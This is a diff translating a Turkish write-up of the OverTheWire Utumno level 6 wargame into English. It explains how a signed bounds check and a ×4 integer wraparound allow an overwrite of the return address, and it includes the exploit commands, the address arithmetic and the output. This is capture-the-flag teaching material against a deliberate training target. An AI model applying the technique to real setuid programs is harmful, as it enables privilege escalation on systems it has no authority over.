@@ -1,72 +1,72 @@
-# OverTheWire — Utumno Level 6 Çözümü (utumno6 → utumno7)
+# OverTheWire — Utumno Level 6 Solution (utumno6 → utumno7)
 
-> Hedef: `utumno6` kullanıcısından `utumno7` kullanıcısının şifresini elde etmek.
-> Teknik: **signed sınır kontrolü bypass + integer (×4) overflow** ile keyfi yazma →
-> return adresini doğrudan ez; executable stack'te env-var shellcode + gömülü `cat`.
+> Goal: Get utumno7 user's password from `utumno6`.
+> Technique: **Signed bounds check bypass + integer (×4) overflow** for arbitrary write →
+> overwrite return address directly; env-var shellcode on executable stack + embedded `cat`.
 
 ---
 
-## 1. Bağlantı
+## 1. Connection
 
 ```bash
 ssh utumno6@utumno.labs.overthewire.org -p 2227
-# şifre: **********   (bir önceki seviyeden)
+# password: **********   (from the previous level)
 ```
 
 ---
 
-## 2. Keşif (Recon)
+## 2. Recon
 
 ```bash
 ls -la /utumno/utumno6
-# -r-sr-x--- 1 utumno7 utumno6 13212 utumno6   <-- SUID utumno7, grup utumno6 = OKUNABİLİR
+# -r-sr-x--- 1 utumno7 utumno6 13212 utumno6   <-- SUID utumno7, group utumno6 = READABLE
 strings /utumno/utumno6
 #   malloc, strtoul, strcpy, printf
 #   "Missing args", "Illegal position in table, quitting..",
 #   "Table position %d has value %d", "Description: %s"
-#   ... -fno-stack-protector ...                <-- canary YOK
+#   ... -fno-stack-protector ...                <-- NO canary
 readelf -l /utumno/utumno6 | grep GNU_STACK     #   RWE -> stack EXECUTABLE
 ```
 
 ---
 
-## 3. Statik Analiz — `main`
+## 3. Static Analysis — `main`
 
 ```bash
 objdump -d -M intel /utumno/utumno6 | sed -n '/<main>:/,/^$/p'
 ```
 
-Sözde kod:
+Pseudocode:
 ```c
 int main(int argc, char **argv) {
     int table[?];                          // ebp-0x30
-    if (argc <= 2) { puts("Missing args"); exit(1); }       // argc >= 3 gerekli
+    if (argc <= 2) { puts("Missing args"); exit(1); }       // argc >= 3 required
     void *ptr = malloc(0x20);
     if (!ptr) { puts("Sorry, ran out of memory"); exit(1); }
     unsigned value    = strtoul(argv[2], NULL, 16);         // [ebp-0x4]
     unsigned position = strtoul(argv[1], NULL, 10);         // [ebp-0x8]
-    if ((int)position > 10) { puts("Illegal position..."); exit(1); }   // SIGNED kontrol!
+    if ((int)position > 10) { puts("Illegal position..."); exit(1); }   // SIGNED check!
     table[position] = value;               // mov [ebp + position*4 - 0x30], value
-    strcpy(ptr, argv[3]);                  // heap'e kopya (zararsız)
+    strcpy(ptr, argv[3]);                  // heap copy (harmless)
     printf("Table position %d has value %d\nDescription: %s\n", position, table[position], ptr);
     return 0;
 }
 ```
 
-### İki zafiyet birleşiyor
-1. **Signed sınır kontrolü:** `if ((int)position > 10) exit;` → `position` **işaretli** kıyaslanıyor.
-   Büyük bir unsigned (yüksek bit set) **negatif** görünür → `≤ 10` testini geçer.
-2. **`table[position] = value`** ⇒ `mov [ebp + position*4 - 0x30], value` → keyfi (relative) yazma.
+### Two vulnerabilities combine
+1. **Signed bounds check:** `if ((int)position > 10) exit;` → `position` is compared as
+   **signed**. A large unsigned value with the high bit set **looks negative** → `≤ 10` check passes.
+2. **`table[position] = value`** ⇒ `mov [ebp + position*4 - 0x30], value` → arbitrary (relative) write.
 
-### Return adresine yazma — `×4` wraparound
-Return adresi `ebp+4`. İstenen: `ebp + position*4 - 0x30 = ebp+4` ⇒ `position*4 ≡ 0x34 (mod 2^32)`.
-- `position = 0xD (13)` doğrudan `0x34` verir ama `13 > 10` → kontrol patlar.
+### Writing to return address — `×4` wraparound
+Return address is at `ebp+4`. We need: `ebp + position*4 - 0x30 = ebp+4` ⇒ `position*4 ≡ 0x34 (mod 2^32)`.
+- `position = 0xD (13)` gives exactly `0x34` but `13 > 10` → check fails.
 - **`position = 0x8000000D = 2147483661`**:
-  - signed = `-2147483635` → `≤ 10` ⇒ **kontrol geçer**.
-  - `position*4 = 0x200000034` → 32-bit'e kırpılır = **`0x34`** ⇒ yazma adresi `ebp+4` = **return adresi!**
+  - Signed = `-2147483635` → `≤ 10` ⇒ **check passes**.
+  - `position*4 = 0x200000034` → truncated to 32 bits = **`0x34`** ⇒ write address = `ebp+4` = **return address!**
 
-⇒ `argv[1] = "2147483661"`, `argv[2] = <hex EGG sled adresi>` → return adresi = shellcode.
-Bu seviyede argv **normal** (argc≥3) — argc-hilesi gerekmez.
+⇒ `argv[1] = "2147483661"`, `argv[2] = <hex EGG sled address>` → return address = shellcode.
+Normal argc (≥3) works here — no argc trick needed.
 
 ---
 
@@ -112,48 +112,48 @@ extern char **environ;
 int main(){ printf("ENVADDR=%p\n",(void*)environ[0]); return 0; }
 ```
 
-### Çalıştırma
+### Execution
 ```bash
 gcc -m32 -o ex6 ex6.c
-gcc -m32 -o /tmp/q7Bn3kLm9z pr.c        # 15-char path, TAZE (önceki seviye sahipliği çakışmasın)
+gcc -m32 -o /tmp/q7Bn3kLm9z pr.c        # 15-char path, FRESH (avoid /tmp ownership conflicts)
 
 ENV0=$(./ex6 find | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
 RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")
-./ex6 run "$RET"        # table[0x8000000D]=RET -> ret ezilir -> sled -> cat
+./ex6 run "$RET"        # table[0x8000000D]=RET -> ret overwritten -> sled -> cat
 ```
 
-Çıktı:
+Output:
 ```
 ENV0=fffef51f RET=ffff6a53
 Table position -2147483635 has value -38317
 Description: x
 **********
 ```
-(`value -38317` = `0xffff6a53`'in signed gösterimi — taşma yazımının kanıtı.)
+(`value -38317` = signed representation of `0xffff6a53` — proof the overflow write worked.)
 
 ---
 
-## 5. Doğrulama
+## 5. Verification
 
 ```bash
 ssh utumno7@utumno.labs.overthewire.org -p 2227
-# şifre: **********
+# password: **********
 ```
 ```
 uid=16007(utumno7) gid=16007(utumno7) groups=16007(utumno7)
 $ cat /etc/utumno_pass/utumno7
 **********
 ```
-✅ Başarılı.
+✅ Success.
 
 ---
 
-## Özet / Alınan Dersler
+## Summary / Lessons Learned
 
-| Konu | Not |
-|------|-----|
-| **Signed bounds bypass** | `(int)position > 10` kontrolü; yüksek-bit'li unsigned negatif görünür → geçer |
-| **Dizi indeksi = keyfi yazma** | `table[position]=value` → `mov [ebp+position*4-0x30], value` |
-| **`×4` wraparound** | `position=0x8000000D` → `*4 mod 2^32 = 0x34` → tam `ebp+4` (return adresi) |
-| **argv normal** | argc≥3 yeter; bu sefer argc-hilesine gerek yok |
-| **Taze /tmp path** | Önceki seviyenin sahipliğiyle çakışmamak için yeni 15-char printer path |
+| Topic | Note |
+|-------|------|
+| **Signed bounds bypass** | `(int)position > 10` check; high-bit unsigned looks negative → passes |
+| **Array index = arbitrary write** | `table[position]=value` → `mov [ebp+position*4-0x30], value` |
+| **`×4` wraparound** | `position=0x8000000D` → `*4 mod 2^32 = 0x34` → exactly `ebp+4` (return address) |
+| **Normal argv** | argc≥3 is sufficient; no argc trick needed this time |
+| **Fresh /tmp path** | Use new 15-char printer path to avoid ownership conflicts with previous levels |
